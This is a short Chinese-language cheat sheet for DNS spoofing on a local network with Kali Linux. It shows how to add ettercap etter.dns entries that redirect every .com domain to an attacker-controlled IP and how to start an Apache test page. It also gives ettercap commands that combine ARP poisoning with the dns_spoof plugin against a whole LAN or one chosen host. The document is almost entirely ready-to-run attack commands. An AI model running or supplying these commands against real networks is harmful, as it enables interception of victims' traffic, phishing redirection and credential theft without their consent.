# kali linux 内网DNS欺骗
## 1.配置ettercap的dns文件
### vim /etc/ettercap/etter.dns
- redirect it to www.linux.org
- *.com A 192.168.1.105
- *.com/* A 192.168.1.105
## 2.修改测试页面启动apache
- vim /var/www/index.html
- service apache2 start
## 3.ettercap欺骗
- ettercap -T -q -i eth0 -P dns_spoof -M arp ////（欺骗整个局域网）
- ettercap -T -q -i eth0 -P dns_spoof -M arp /(网关)/ /(IP)/（欺骗某个IP）
